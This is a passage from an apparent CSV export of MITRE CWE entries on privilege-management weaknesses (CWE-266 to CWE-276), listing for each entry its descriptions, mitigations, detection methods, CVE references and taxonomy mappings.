day-to-day operations.::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Identify the functionality that requires additional privileges, such as access to privileged operating system resources. Wrap and centralize this functionality if possible, and isolate the privileged code as much as possible from other code [REF-76]. Raise privileges as late as possible, and drop them as soon as possible to avoid CWE-271. Avoid weaknesses such as CWE-288 and CWE-420 by protecting all possible communication channels that could interact with the privileged code, such as a secondary socket that is only intended to be accessed by administrators.::PHASE:Architecture and Design:STRATEGY:Attack Surface Reduction:DESCRIPTION:Identify the functionality that requires additional privileges, such as access to privileged operating system resources. Wrap and centralize this functionality if possible, and isolate the privileged code as much as possible from other code [REF-76]. Raise privileges as late as possible, and drop them as soon as possible to avoid CWE-271. Avoid weaknesses such as CWE-288 and CWE-420 by protecting all possible communication channels that could interact with the privileged code, such as a secondary socket that is only intended to be accessed by administrators.::PHASE:Implementation:DESCRIPTION:Perform extensive input validation for any privileged code that must be exposed to the user and reject anything that does not fit your strict requirements.::PHASE:Implementation:DESCRIPTION:When dropping privileges, ensure that they have been dropped successfully to avoid CWE-273. As protection mechanisms in the environment get stronger, privilege-dropping calls may fail even if it seems like they would always succeed.::PHASE:Implementation:DESCRIPTION:If circumstances force you to run with extra privileges, then determine the minimum access level necessary. First identify the different permissions that the software and its users will need to perform their actions, such as file read and write permissions, network socket permissions, and so forth. Then explicitly allow those actions while denying all else [REF-76]. Perform extensive input validation and canonicalization to minimize the chances of introducing a separate vulnerability. This mitigation is much more prone to error than dropping the privileges in the first place.::PHASE:Operation System Configuration:STRATEGY:Environment Hardening:DESCRIPTION:Ensure that the software runs properly under the United States Government Configuration Baseline (USGCB) [REF-199] or an equivalent hardening configuration guide, which many organizations use to limit the attack surface and potential risk of deployed software.::\",\"::REFERENCE:CVE-2007-4217:DESCRIPTION:FTP client program on a certain OS runs with setuid privileges and has a buffer overflow. Most clients do not need extra privileges, so an overflow is not a vulnerability for those clients.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-4217::REFERENCE:CVE-2008-1877:DESCRIPTION:Program runs with privileges and calls another program with the same privileges, which allows read of arbitrary files.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1877::REFERENCE:CVE-2007-5159:DESCRIPTION:OS incorrectly installs a program with setuid privileges, allowing users to gain privileges.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-5159::REFERENCE:CVE-2008-4638:DESCRIPTION:Composite: application running with high privileges (CWE-250) allows user to specify a restricted file to process, which generates a parsing error that leaks the contents of the file (CWE-209).:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4638::REFERENCE:CVE-2008-0162:DESCRIPTION:Program does not drop privileges before calling another program, allowing code execution.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0162::REFERENCE:CVE-2008-0368:DESCRIPTION:setuid root program allows creation of arbitrary files through command line argument.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0368::REFERENCE:CVE-2007-3931:DESCRIPTION:Installation script installs some programs as setuid when they shouldn't be.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-3931::REFERENCE:CVE-2020-3812:DESCRIPTION:mail program runs as root but does not drop its privileges before attempting to access a file. Attacker can use a symlink from their home directory to a directory only readable by root, then determine whether the file exists based on the response.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-3812::REFERENCE:CVE-2003-0908:DESCRIPTION:Product launches Help functionality while running with raised privileges, allowing command execution using Windows message to access open file dialog.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0908::\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Often Misused: Privilege Management::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SER09-J:ENTRY NAME:Minimize privileges before deserializing from a privilege context::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 2-4:ENTRY NAME:Req SP.03.05 BR::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 2-4:ENTRY NAME:Req SP.03.08 BR::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 2-4:ENTRY NAME:Req SP.03.08 RE(1)::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 2-4:ENTRY NAME:Req SP.05.07 BR::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 2-4:ENTRY NAME:Req SP.09.02 RE(4)::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 2-4:ENTRY NAME:Req SP.09.03 BR::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 2-4:ENTRY NAME:Req SP.09.04 BR::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 1.1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 1.2::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 2.1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 2.1 RE 1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SD-4::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CCSC 3::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 1.1::\",::104::470::69::,\"::TYPE:Relationship:NOTE:There is a close association with CWE-653 (Insufficient Separation of Privileges). CWE-653 is about providing separate components for each privilege; CWE-250 is about ensuring that each component has the least amount of privileges possible.::TYPE:Maintenance:NOTE:CWE-271, CWE-272, and CWE-250 are all closely related and possibly overlapping. CWE-271 is probably better suited as a category. Both CWE-272 and CWE-250 are in active use by the community. The least privilege phrase has multiple interpretations.::TYPE:Maintenance:NOTE:The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the Mapping CWE to 62443 subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.::\","
  },
  "doc-386bf026098ba769c8ccfa6b1f0640ec": {
    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n266,\"Incorrect Privilege Assignment\",Base,Draft,\"A product incorrectly assigns a privilege to a particular actor, creating an unintended sphere of control for that actor.\",\"\",::NATURE:ChildOf:CWE ID:269:VIEW ID:1000:ORDINAL:Primary::NATURE:CanAlsoBe:CWE ID:286:VIEW ID:1000::,\"::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:A user can access restricted functionality and/or sensitive information that may include administrative functionality and user accounts.::\",\"\",\"::PHASE:Architecture and Design Operation:DESCRIPTION:Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::\",\"::REFERENCE:CVE-1999-1193:DESCRIPTION:untrusted user placed in unix wheel group:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1193::REFERENCE:CVE-2005-2741:DESCRIPTION:Product allows users to grant themselves certain rights that can be used to escalate privileges.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2741::REFERENCE:CVE-2005-2496:DESCRIPTION:Product uses group ID of a user instead of the group, causing it to run with different privileges. This is resultant from some other unknown issue.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2496::REFERENCE:CVE-2004-0274:DESCRIPTION:Product mistakenly assigns a particular status to an entity, leading to increased privileges.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0274::\",,::System Process::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Incorrect Privilege Assignment::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SEC00-J:ENTRY NAME:Do not allow privileged blocks to leak sensitive information across a trust boundary::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SEC01-J:ENTRY NAME:Do not allow tainted variables in privileged blocks::\",,\"\",\n267,\"Privilege Defined With Unsafe Actions\",Base,Incomplete,\"A particular privilege, role, capability, or right can be used to perform unsafe actions that were not intended, even when it is assigned to the correct entity.\",\"\",::NATURE:ChildOf:CWE ID:269:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Operation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:A user can access restricted functionality and/or sensitive information that may include administrative functionality and user accounts.::\",\"\",\"::PHASE:Architecture and Design Operation:DESCRIPTION:Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::\",\"::REFERENCE:CVE-2002-1981:DESCRIPTION:Roles have access to dangerous procedures (Accessible entities).:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1981::REFERENCE:CVE-2002-1671:DESCRIPTION:Untrusted object/method gets access to clipboard (Accessible entities).:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1671::REFERENCE:CVE-2004-2204:DESCRIPTION:Gain privileges using functions/tags that should be restricted (Accessible entities).:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2204::REFERENCE:CVE-2000-0315:DESCRIPTION:Traceroute program allows unprivileged users to modify source address of packet (Accessible entities).:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0315::REFERENCE:CVE-2004-0380:DESCRIPTION:Bypass domain restrictions using a particular file that references unsafe URI schemes (Accessible entities).:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0380::REFERENCE:CVE-2002-1154:DESCRIPTION:Script does not restrict access to an update command, leading to resultant disk consumption and filled error logs (Accessible entities).:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1154::REFERENCE:CVE-2002-1145:DESCRIPTION:public database user can use stored procedure to modify data controlled by the database owner (Unsafe privileged actions).:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1145::REFERENCE:CVE-2000-0506:DESCRIPTION:User with capability can prevent setuid program from dropping privileges (Unsafe privileged actions).:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0506::REFERENCE:CVE-2002-2042:DESCRIPTION:Allows attachment to and modification of privileged processes (Unsafe privileged actions).:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2042::REFERENCE:CVE-2000-1212:DESCRIPTION:User with privilege can edit raw underlying object using unprotected method (Unsafe privileged actions).:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1212::REFERENCE:CVE-2005-1742:DESCRIPTION:Inappropriate actions allowed by a particular role(Unsafe privileged actions).:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1742::REFERENCE:CVE-2001-1480:DESCRIPTION:Untrusted entity allowed to access the system clipboard (Unsafe privileged actions).:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1480::REFERENCE:CVE-2001-1551:DESCRIPTION:Extra Linux capability allows bypass of system-specified restriction (Unsafe privileged actions).:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1551::REFERENCE:CVE-2001-1166:DESCRIPTION:User with debugging rights can read entire process (Unsafe privileged actions).:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1166::REFERENCE:CVE-2005-1816:DESCRIPTION:Non-root admins can add themselves or others to the root admin group (Unsafe privileged actions).:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1816::REFERENCE:CVE-2005-2173:DESCRIPTION:Users can change certain properties of objects to perform otherwise unauthorized actions (Unsafe privileged actions).:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2173::REFERENCE:CVE-2005-2027:DESCRIPTION:Certain debugging commands not restricted to just the administrator, allowing registry modification and infoleak (Unsafe privileged actions).:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2027::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Unsafe Privilege::\",::58::634::637::643::648::,\"::TYPE:Maintenance:NOTE:Note: there are 2 separate sub-categories here: - privilege incorrectly allows entities to perform certain actions - object is incorrectly accessible to entities with a given privilege::\",\n268,\"Privilege Chaining\",Base,Draft,\"Two distinct privileges, roles, capabilities, or rights can be combined in a way that allows an entity to perform unsafe actions that would not be allowed without that combination.\",\"\",::NATURE:ChildOf:CWE ID:269:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Operation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:A user can be given or gain access rights of another user. This can give the user unauthorized access to sensitive information including the access information of another user.::\",\"\",\"::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource.::PHASE:Architecture and Design Operation:DESCRIPTION:Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::\",\"::REFERENCE:CVE-2005-1736:DESCRIPTION:Chaining of user rights.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1736::REFERENCE:CVE-2002-1772:DESCRIPTION:Gain certain rights via privilege chaining in alternate channel.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1772::REFERENCE:CVE-2005-1973:DESCRIPTION:Application is allowed to assign extra permissions to itself.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1973::REFERENCE:CVE-2003-0640:DESCRIPTION:operator user can overwrite usernames and passwords to gain admin privileges.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0640::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Privilege Chaining::\",,\"::TYPE:Relationship:NOTE:There is some conceptual overlap with Unsafe Privilege.::\",\n270,\"Privilege Context Switching Error\",Base,Draft,\"The product does not properly manage privileges while it is switching between different contexts that have different privileges or spheres of control.\",\"\",::NATURE:ChildOf:CWE ID:269:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Operation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:A user can assume the identity of another user with separate privileges in another context. This will give the user unauthorized access that may allow them to acquire the access information of other users.::\",\"\",\"::PHASE:Architecture and Design Operation:DESCRIPTION:Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource.::\",\"::REFERENCE:CVE-2002-1688:DESCRIPTION:Web browser cross domain problem when user hits back button.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1688::REFERENCE:CVE-2003-1026:DESCRIPTION:Web browser cross domain problem when user hits back button.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1026::REFERENCE:CVE-2002-1770:DESCRIPTION:Cross-domain issue - third party product passes code to web browser, which executes it in unsafe zone.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1770::REFERENCE:CVE-2005-2263:DESCRIPTION:Run callback in different security context after it has been changed from untrusted to trusted. * note that context switch before actions are completed is one type of problem that happens frequently, espec. in browsers.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2263::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Privilege Context Switching Error::\",::17::30::35::,\"::TYPE:Research Gap:NOTE:This concept needs more study.::\",\n272,\"Least Privilege Violation\",Base,Incomplete,\"The elevated privilege level required to perform operations such as chroot() should be dropped immediately after the operation is performed.\",\"\",::NATURE:ChildOf:CWE ID:271:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Operation::\",\"\",,\"::SCOPE:Access Control:SCOPE:Confidentiality:IMPACT:Gain Privileges or Assume Identity:IMPACT:Read Application Data:IMPACT:Read Files or Directories:NOTE:An attacker may be able to access resources with the elevated privilege that could not be accessed with the attacker's original privileges. This is particularly likely in conjunction with another flaw, such as a buffer overflow.::\",\"::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Compare binary / bytecode to application permission manifest:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Host-based Vulnerability Scanners - Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:SOAR Partial::METHOD:Automated Static Analysis:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Permission Manifest Analysis:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.) Formal Methods / Correct-By-Construction Cost effective for partial coverage: Attack Modeling:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design Operation:DESCRIPTION:Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Follow the principle of least privilege when assigning access rights to entities in a software system.::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Least Privilege Violation::TAXONOMY NAME:CLASP:ENTRY NAME:Failure to drop privileges when reasonable::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:POS02-C:ENTRY NAME:Follow the principle of least privilege::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SEC00-J:ENTRY NAME:Do not allow privileged blocks to leak sensitive information across a trust boundary::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SEC01-J:ENTRY NAME:Do not allow tainted variables in privileged blocks::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP36:ENTRY NAME:Privilege::\",::17::35::76::,\"::TYPE:Maintenance:NOTE:CWE-271, CWE-272, and CWE-250 are all closely related and possibly overlapping. CWE-271 is probably better suited as a category.::TYPE:Other:NOTE:If system privileges are not dropped when it is reasonable to do so, this is not a vulnerability by itself. According to the principle of least privilege, access should be allowed only when it is absolutely necessary to the function of a given system, and only for the minimal necessary amount of time. Any further allowance of privilege widens the window of time during which a successful exploitation of the system will provide an attacker with that same privilege. If at all possible, limit the allowance of system privilege to small, simple sections of code that may be called atomically. When a program calls a privileged function, such as chroot(), it must first acquire root privilege. As soon as the privileged operation has completed, the program should drop root privilege and return to the privilege level of the invoking user.::\",\n273,\"Improper Check for Dropped Privileges\",Base,Incomplete,\"The product attempts to drop privileges but does not check or incorrectly checks to see if the drop succeeded.\",\"If the drop fails, the product will continue to run with the raised privileges, which might provide additional access to unprivileged users.\",::NATURE:ChildOf:CWE ID:754:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:754:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:271:VIEW ID:1000::NATURE:PeerOf:CWE ID:252:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"::In Windows based environments that have access control, impersonation is used so that access checks can be performed on a client identity by a server with higher privileges. By impersonating the client, the server is restricted to client-level security -- although in different threads it may have much higher privileges.::\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic. This issue is likely to occur in restrictive environments in which the operating system or application provides fine-grained control over privilege management.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:If privileges are not dropped, neither are access rights of the user. Often these rights can be prevented from being dropped.::SCOPE:Access Control:SCOPE:Non-Repudiation:IMPACT:Gain Privileges or Assume Identity:IMPACT:Hide Activities:NOTE:If privileges are not dropped, in some cases the system may record actions as the user which is being impersonated rather than the impersonator.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:STRATEGY:Separation of Privilege:DESCRIPTION:Compartmentalize the system to have safe areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area. Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.::PHASE:Implementation:DESCRIPTION:Check the results of all functions that return a value and verify that the value is expected.:EFFECTIVENESS:High::PHASE:Implementation:DESCRIPTION:In Windows, make sure that the process token has the SeImpersonatePrivilege(Microsoft Server 2003). Code that relies on impersonation for security must ensure that the impersonation succeeded, i.e., that a proper privilege demotion happened.::\",\"::REFERENCE:CVE-2006-4447:DESCRIPTION:Program does not check return value when invoking functions to drop privileges, which could leave users with higher privileges than expected by forcing those functions to fail.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4447::REFERENCE:CVE-2006-2916:DESCRIPTION:Program does not check return value when invoking functions to drop privileges, which could leave users with higher privileges than expected by forcing those functions to fail.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-2916::\",,::System Process::,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Failure to check whether privileges were dropped successfully::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:POS37-C:ENTRY NAME:Ensure that privilege relinquishment is successful:MAPPING FIT:Exact::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP4:ENTRY NAME:Unchecked Status Condition::\",,\"\",\n274,\"Improper Handling of Insufficient Privileges\",Base,Draft,\"The product does not handle or incorrectly handles when it has insufficient privileges to perform an operation, leading to resultant weaknesses.\",\"\",::NATURE:ChildOf:CWE ID:755:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:269:VIEW ID:1000::NATURE:PeerOf:CWE ID:271:VIEW ID:1000::NATURE:CanAlsoBe:CWE ID:280:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Operation::\",\"\",,\"::SCOPE:Other:IMPACT:Other:IMPACT:Alter Execution Logic::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"::REFERENCE:CVE-2001-1564:DESCRIPTION:System limits are not properly enforced after privileges are dropped.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1564::REFERENCE:CVE-2005-3286:DESCRIPTION:Firewall crashes when it can't read a critical memory block that was protected by a malicious process.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3286::REFERENCE:CVE-2005-1641:DESCRIPTION:Does not give admin sufficient privileges to overcome otherwise legitimate user actions.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1641::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Insufficient privileges::\",,\"::TYPE:Maintenance:NOTE:CWE-280 and CWE-274 are too similar. It is likely that CWE-274 will be deprecated in the future.::TYPE:Relationship:NOTE:Overlaps dropped privileges, insufficient permissions.::TYPE:Theoretical:NOTE:This has a layering relationship with Unchecked Error Condition and Unchecked Return Value.::TYPE:Theoretical:NOTE:Within the context of vulnerability theory, privileges and permissions are two sides of the same coin. Privileges are associated with actors, and permissions are associated with resources. To perform access control, at some point the product makes a decision about whether the actor (and the privileges that have been assigned to that actor) is allowed to access the resource (based on the permissions that have been specified for that resource).::\",\n276,\"Incorrect Default Permissions\",Base,Draft,\"During installation, installed file permissions are set to allow anyone to modify those files.\",\"\",::NATURE:ChildOf:CWE ID:732:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:732:VIEW ID:1003:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::PHASE:Installation::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Application Data:IMPACT:Modify Application Data::\",\"::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Inter-application Flow Analysis:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Host-based Vulnerability Scanners - Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Host Application Interface Scanner Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer Automated Monitored Execution Forced Path Execution:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:SOAR Partial::METHOD:Automated Static Analysis:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Configuration Checker:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: 